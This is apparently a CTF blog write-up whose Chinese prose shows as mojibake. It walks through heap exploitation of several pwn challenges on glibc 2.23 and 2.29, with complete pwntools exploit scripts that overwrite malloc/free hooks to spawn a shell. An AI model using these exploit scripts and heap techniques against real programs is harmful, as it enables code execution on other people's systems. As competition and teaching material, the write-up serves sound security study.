---
layout: post
title:  "ğŸ‘´å¯èƒ½æ˜¯ä¸ªç›²äºº"
date:   2020-2-23
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF]
icon: icon-html
---

# 0x1

è¿™å‡ å¤©ğŸ‘´æ‰“äº†iæ˜¥ç§‹çš„å¸¦å–„äººCTFï¼Œåšäº†ä¿©pwnä¹‹åğŸ‘´è§‰å¾—ğŸ‘´å°±æ˜¯ä¸ªç›²äºº

ä»Šå¤©æ˜¯2æœˆ23å·ï¼Œè®©ğŸ‘´æƒ³åˆ°äº†glibc2.23ï¼Œè¿™æ˜¯ä¸ªå¥½æ—¥å­ï¼Œæ‰€ä»¥ä»Šå¤©è®°å½•ä¸€ä¸‹

# document

uaf

## glibc2.29

ğŸ‘´è¯•äº†ä¸€ä¸‹å‘ç°éªŒäº†double freeï¼Œç›´æ¥2.29å¼€å§‹å¹²

åªèƒ½addä¸ƒæ¬¡

ğŸ‘´åˆšå¼€å§‹ä»¥ä¸ºå…¨å±€åªèƒ½ä¸€æ¬¡editï¼Œâ‘§ä¼šæ‰“ï¼Œå¤šä¸€æ¬¡addæˆ–è€…editå°±è¡Œäº†

åæ¥å‘ç°æ˜¯æ¯ä¸ªchunkå¯ä»¥editä¸€æ¬¡

editèƒ½æŠŠtcacheçš„keyæ”¹äº†ï¼Œç»•è¿‡double freeæ£€æŸ¥

4ä¸ªdouble freeå°±æ˜¯7tcache+1unsorted binï¼Œunsorted binæ³„éœ²libcï¼Œç„¶åtcacheæ‰“free hook

æ‹¿unsortedbinå¯ä»¥å¡«7ä¸ªï¼Œä¹Ÿå¯ä»¥æ‰“tcache\_perthread\_structï¼Œä¹Ÿå¯ä»¥tcacheé“¾æå‡ºæ¥-1ï¼Œ-1>7

```python
from pwn import *
#r = process(['./lib/ld-2.29.so','--library-path','./lib/','./pwn'])
r = remote('123.56.85.29',4807)
libc = ELF('./lib/libc.so.6')


def add(name,sex,info):
	r.recvuntil('choice :')
	r.sendline('1')
	r.recvuntil('name')
	r.send(name)
	r.recvuntil('sex')
	r.send(sex)
	r.recvuntil('information')
	r.send(info)

def show(index):
	r.recvuntil('choice :')
	r.sendline('2')
	r.recvuntil('index :')
	r.sendline(str(index))

def free(index):
	r.recvuntil('choice :')
	r.sendline('4')
	r.recvuntil('index :')
	r.sendline(str(index))

def edit(index,yn,info):
	r.recvuntil('choice :')
	r.sendline('3')
	r.recvuntil('index :')
	r.sendline(str(index))
	r.recvuntil('sex?')
	r.send(yn)
	r.recvuntil('information')
	r.send(info)


add('a'*8,'W','\x00'*0x70)
add('c'*8,'M','\x00'*0x70)
add('c'*8,'M','\x00'*0x70)
add('c'*8,'M','\x00'*0x70)

free(0)

free(1)
show(1)
r.recvline()
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
heap_base = leak - (0x8429280-0x8429000)
log.success(hex(heap_base))
payload = p64(heap_base)
payload = payload.ljust(0x70,'\x00')

edit(0,'Y','\x11'*0x70)
free(0)
edit(1,'Y','\x22'*0x70)
free(3)
edit(3,'Y','\x33'*0x70)
free(3)
free(2)
edit(2,'Y','\x44'*0x70)
free(2)
free(1)

show(1)
r.recvline()
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak-96-libc.sym['__malloc_hook']-0x10
malloc_hook = libc_base +libc.sym['__malloc_hook']
free_hook = libc_base +libc.sym['__free_hook']
system = libc_base+libc.sym['system']
log.success(hex(malloc_hook))
log.success(hex(free_hook))
one = libc_base+0xc224f
log.success(hex(libc_base))

add(p64(free_hook),'W','/bin/sh\x00'*14)#5
add('/bin/sh\x00','W','/bin/sh\x00'*14)#6
add(p64(system),'W','/bin/sh\x00'*14)#7

r.interactive()

```

ä½†æ˜¯ğŸ‘´è¿œç¨‹æ‰“ä¸é€š

## glibc2.23

buuçš„å¤ç°ç¯å¢ƒæ˜¯2.23

ğŸ‘´å¯»æ€æ¯”èµ›è¿œç¨‹åº”è¯¥ä¸æ˜¯2.23ï¼Œå¦‚æœæ˜¯2.23ğŸ‘´æ‰“2.29çš„expæ‰“è¿‡å»unsorted bin double freeå¿…crash

freeæ—¶åªfreeäº†0x90çš„chunkï¼Œ0x20ä¸åŠ¨ï¼Œ0x90è¿›unsorted binï¼Œshowæ‹¿libcåœ°å€

addæ—¶æ‹¿0x20å’Œ0x90çš„chunkï¼Œä»unsorted biné‡Œåˆ‡ï¼Œ å¯ä»¥åˆ¶é€ å †å—é‡å è¦†ç›–åˆ°æŸä¸ª0x20chunkæŒ‡å‘0x90chunkçš„æŒ‡é’ˆï¼ŒæŠŠæŒ‡é’ˆæ”¹ä¸ºfree_hookï¼Œç„¶åeditæŠŠsystemå†™è¿›å»

```c
pwndbg> x/64gx 0x8000000+0x202060
0x8202060:      0x0000000008403010      0x00000000084030c0
0x8202070:      0x0000000008403170      0x0000000008403030
0x8202080:      0x0000000008403050      0x0000000000000000
```

```c
pwndbg> x/64gx 0x8403000
0x8403000:      0x0000000000000000      0x0000000000000021
0x8403010:      0x0000000008403030      0x0000000000000001
0x8403020:      0x0000000000000000      0x0000000000000021
0x8403030:      0x00000000084030e0      0x0000000000000001
0x8403040:      0x0000000000000000      0x0000000000000021
0x8403050:      0x0000000008403190      0x0000000000000001
0x8403060:      0x0000000000000000      0x0000000000000051
0x8403070:      0x00007fffff3f4bb8      0x00007fffff3f4bb8
0x8403080:      0x0000000000000000      0x0000000000000000
0x8403090:      0x0000000000000000      0x0000000000000000
0x84030a0:      0x0000000000000000      0x0000000000000000
0x84030b0:      0x0000000000000050      0x0000000000000020
0x84030c0:      0x00000000084030e0      0x0000000000000001
0x84030d0:      0x0000000000000000      0x0000000000000091
0x84030e0:      0x6161616161616161      0x0000000000000001
0x84030f0:      0x0000000000000000      0x0000000000000000
0x8403100:      0x0000000000000000      0x0000000000000000
0x8403110:      0x0000000000000000      0x0000000000000000
0x8403120:      0x0000000000000000      0x0000000000000000
0x8403130:      0x0000000000000000      0x0000000000000000
0x8403140:      0x0000000000000000      0x0000000000000000
0x8403150:      0x0000000000000000      0x0000000000000000
0x8403160:      0x0000000000000090      0x0000000000000021
0x8403170:      0x0000000008403190      0x0000000000000001
0x8403180:      0x0000000000000000      0x0000000000000091
0x8403190:      0x0068732f6e69622f      0x0000000000000001
0x84031a0:      0x0000000000000000      0x0000000000000000
```



```python
from pwn import *
#r = process(['./lib/ld-2.29.so','--library-path','./lib/','./pwn'])
r = process('./pwn')
#r = remote('node3.buuoj.cn',25927)
libc = ELF('/libc-2.23.so')


def add(name,sex,info):
	r.recvuntil('choice :')
	r.sendline('1')
	r.recvuntil('name')
	r.send(name)
	r.recvuntil('sex')
	r.send(sex)
	r.recvuntil('information')
	r.send(info)

def show(index):
	r.recvuntil('choice :')
	r.sendline('2')
	r.recvuntil('index :')
	r.sendline(str(index))

def free(index):
	r.recvuntil('choice :')
	r.sendline('4')
	r.recvuntil('index :')
	r.sendline(str(index))

def edit(index,yn,info):
	r.recvuntil('choice :')
	r.sendline('3')
	r.recvuntil('index :')
	r.sendline(str(index))
	r.recvuntil('sex?')
	r.send(yn)
	r.recvuntil('information')
	r.send(info)


add('a'*8,'W','\x00'*0x70)
free(0)
edit(0,'Y',p64(0)+p64(0)+'\x00'*0x50)
r.interactive()
add('a'*8,'W','\x00'*0x70)
add('a'*8,'W','\x00'*0x70)
free(0)

show(0)
r.recvline()
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak-88-libc.sym['__malloc_hook']-0x10
malloc_hook = libc_base +libc.sym['__malloc_hook']
free_hook = libc_base +libc.sym['__free_hook']
system = libc_base+libc.sym['system']
log.success(hex(malloc_hook))
log.success(hex(free_hook))
one = libc_base+0x4526a
log.success(hex(libc_base))

free(1)
free(2)
add('a'*8,'W','\x00'*0x70)
add('/bin/sh\x00','W','\x00'*0x70)
edit(0,'Y',p64(0)+p64(0x21)+p64(free_hook-0x10)+p64(1)+'\x11'*0x50)

edit(4,'Y',p64(system)+p64(0)+'\x00'*0x50)
free(2)
r.interactive()

```



# ä¸€é¢—èµ›è‰‡

uaf

## glibc2.29

ğŸ‘´è¯•äº†ä¸€ä¸‹å‘ç°éªŒäº†double free...

addæ˜¯ä¸€æ¬¡malloc3ä¸ªï¼Œå…¶ä¸­ä¸€ä¸ªå¤§å°æ˜¯0x20å‚¨å­˜baå’ŒnaæŒ‡é’ˆï¼Œå¦å¤–ä¿©sizeğŸ‘´å†³å®šï¼Œä¸èƒ½å°äº0ä¸èƒ½å¤§äº0x70

ä¹Ÿå°±æ˜¯ğŸ‘´å¯ä»¥ç”³è¯·0x20çš„

è¿™æ ·ä¸€æ¬¡add3ä¸ªä¸€æ¬¡freeä¹Ÿæ˜¯3ä¸ªï¼Œå¡«æ»¡tcacheä¸éœ€è¦è€—è´¹å¾ˆå¤šaddæ¬¡æ•°

tcacheå¡«æ»¡ï¼Œè¿›fastbin double freeï¼Œç›¸å½“äºæ§åˆ¶äº†tcacheä¸­ä¸€ä¸ªchunkçš„fd

ç„¶åtcache attackæ‰“free hook

```python
from pwn import *
r = process(['/pwnlib/ld-2.29.so','--library-path','/pwnlib/','./excited'])
#r = remote('123.56.85.29',6484)
libc = ELF('/pwnlib/libc.so.6')
elf = ELF('./excited')

def add(basize,ba,nasize,na):
	r.recvuntil('want to do :')
	r.sendline('1')
	r.recvuntil('ba\'s length :')
	r.sendline(str(basize))
	r.recvuntil('ba :')
	r.send(ba)
	r.recvuntil('na\'s length :')
	r.sendline(str(nasize))
	r.recvuntil('na :')
	r.send(na)

def show(index):
	r.recvuntil('want to do :')
	r.sendline('4')
	r.recvuntil('project ID :')
	r.sendline(str(index))

def free(index):
	r.recvuntil('want to do :')
	r.sendline('3')
	r.recvuntil('Banana ID :')
	r.sendline(str(index))

add(0x10,'\x11'*8,0x10,'\x11'*8)
add(0x10,'\x22'*8,0x10,'\x22'*8)
add(0x10,'\x33'*8,0x10,'\x33'*8)
free(0)
free(1)
free(2)



show(0)
r.recvuntil('Banana\'s ba is ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
log.success(hex(leak))


add(0x10,p64(leak+(0x842a560-0x842a4c0))+p64(leak+(0x842a5a0-0x842a4c0)),0x10,'/bin/sh\x00')
log.success(hex(leak))
free(1)
puts_got = elf.got['puts']
add(0x10,p64(elf.got['puts'])*2,0x10,p64(leak+(0x842a550-0x842a4c0)))#

add(0x10,p64(puts_got)*2,0x10,p64(puts_got)*2)

show(0)
r.recvuntil('Banana\'s ba is ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak-libc.sym['puts']
log.success(hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
log.success(hex(free_hook))
log.success(hex(system))

add(0x10,p64(free_hook),0x20,p64(free_hook))

add(0x10,p64(system),0x20,p64(free_hook))
free(3)
r.interactive()

```

è¿œç¨‹æ‰“ä¸é€šï¼ŒğŸ‘´æ‰å‘ç°æ˜¯2.23

## glibc2.23

fastbin double free

ç”³è¯·0x20çš„chunkå¯ä»¥æ‰“åˆ°å‚¨å­˜baå’ŒnaæŒ‡é’ˆçš„ä½ç½®ï¼Œuafæ³„éœ²gotè¡¨

double freeæ‰“malloc_hookï¼Œä½†æ˜¯onegadgetä¸å¥½ä½¿

ğŸ‘´gdbçœ‹äº†ä¸€ä¸‹free_hookå‘ç°free_hook-0x13æœ‰ä¸ª0x7fï¼Œä½†æ˜¯æ‰“ä¸è¿‡å»ï¼ŒğŸ‘´å¯èƒ½æ˜¯è¢«éª—äº†

é‚£ğŸ‘´ç”¨reallocè°ƒæ•´æ ˆå†è·³realloc_hookâ‘§

```python
from pwn import *
r = process('./excited1')
#r = remote('123.56.85.29',6484)
#r = remote('node3.buuoj.cn',28837)
libc = ELF('./libc-2.23.so')
elf = ELF('./excited1')


def add(basize,ba,nasize,na):
	r.recvuntil('want to do :')
	r.sendline('1')
	r.recvuntil('ba\'s length :')
	r.sendline(str(basize))
	r.recvuntil('ba :')
	r.send(ba)
	r.recvuntil('na\'s length :')
	r.sendline(str(nasize))
	r.recvuntil('na :')
	r.send(na)



def show(index):
	r.recvuntil('want to do :')
	r.sendline('4')
	r.recvuntil('project ID :')
	r.sendline(str(index))

def free(index):
	r.recvuntil('want to do :')
	r.sendline('3')
	r.recvuntil('Banana ID :')
	r.sendline(str(index))



add(0x30,'\x22'*8,0x68,'\x22'*8)
add(0x30,'\x33'*8,0x68,'\x33'*8)
free(0)
free(1)
free(0)
add(0x10,p64(elf.got['puts'])*2,0x50,'\x33'*8)

show(1)
r.recvuntil('Banana\'s ba is ')
leak = u64(r.recvuntil('\n',drop=True).ljust(8,'\x00'))
libc_base = leak-libc.sym['puts']
log.success(hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc= libc_base + libc.sym['realloc']
one = libc_base +0xf1147
log.success(hex(free_hook))
log.success(hex(one))
log.success(hex(malloc_hook))
free(2)
print(hex(elf.got['puts']))
add(0x68,p64(malloc_hook-0x23),0x68,p64(malloc_hook-0x23))

add(0x68,p64(malloc_hook-0x23),0x68,'a'*0xb+p64(one)+p64(realloc+2))

r.interactive()
```

ä½†æ˜¯è¿œç¨‹æ‰“ä¸é€šï¼Œå› ä¸ºflagå·²ç»è¯»åˆ°ç¨‹åºé‡Œäº†ï¼Œç›´æ¥è¯»flagå°±å®Œäº‹äº†ï¼Œä¸ç”¨getshell

iæ˜¥ç§‹çš„dockerä¼°è®¡æ ¹æ®é¢˜ç›®è¦æ±‚æ¥çš„ï¼Œè¯»flagå°±å®Œäº‹çš„é¢˜æƒ³getshelléƒ½â‘§è¡Œ

ğŸ‘´åœ¨buuå°±èƒ½æ‰“é€š

æ‰€ä»¥è¿™é¢˜å…¶å®åœ¨ğŸ‘´æ³„éœ²gotè¡¨çš„æ—¶å€™å°±å·²ç»ç»“æŸäº†

```python
from pwn import *
r = process('./excited1')
#r = remote('node3.buuoj.cn',28837)
libc = ELF('./libc-2.23.so')
elf = ELF('./excited1')


def add(basize,ba,nasize,na):
	r.recvuntil('want to do :')
	r.sendline('1')
	r.recvuntil('ba\'s length :')
	r.sendline(str(basize))
	r.recvuntil('ba :')
	r.send(ba)
	r.recvuntil('na\'s length :')
	r.sendline(str(nasize))
	r.recvuntil('na :')
	r.send(na)



def show(index):
	r.recvuntil('want to do :')
	r.sendline('4')
	r.recvuntil('project ID :')
	r.sendline(str(index))

def free(index):
	r.recvuntil('want to do :')
	r.sendline('3')
	r.recvuntil('Banana ID :')
	r.sendline(str(index))



add(0x30,'\x22'*8,0x30,'\x22'*8)
add(0x30,'\x22'*8,0x30,'\x22'*8)
free(0)
free(1)
add(0x10,p64(0x6020a8)*2,0x10,p64(0x6020a8)*2)
show(0)
r.interactive()


```


## signin

glibc2.29 uaf

æœ‰åé—¨ï¼Œéœ€è¦è¦†ç›–æŒ‡é’ˆ

editæœ‰è®¡æ•°å™¨cntï¼Œåˆå§‹ä¸º0ï¼Œå¤§äºç­‰äº0å¯ä»¥edit

glibc 2.29 tcache freeæ—¶å†™å…¥key mallocæ¸…é™¤key

editåtcacheæ‰“åˆ°cntçš„ä½ç½®å°±å¯ä»¥æŠŠcntæ¸…0å†æ¬¡edit

```python
from pwn import *
#r = process(['/pwnlib/ld-2.29.so','--library-path','/pwnlib/','./pwn'])
r = process('./pwn')
#r = remote('123.56.85.29',4205)
libc = ELF('/pwnlib/libc.so.6')
elf = ELF('./pwn')

def add(index):
	r.recvuntil('your choice?')
	r.sendline('1')
	r.recvuntil('idx?')
	r.sendline(str(index))

def edit(index,data):
	r.recvuntil('your choice?')
	r.sendline('2')
	r.recvuntil('idx?')
	r.sendline(str(index))
	sleep(0.1)
	r.send(data)
def free(index):
	r.recvuntil('your choice?')
	r.sendline('3')
	r.recvuntil('idx?')
	r.sendline(str(index))

cnt = 0x4040BC
ptr = 0x4040C0
add(0)
free(0)
edit(0,p64(0x4040B0))
add(1)
add(2)
edit(2,p64(1)*4)
r.sendline('6')
r.interactive()
```

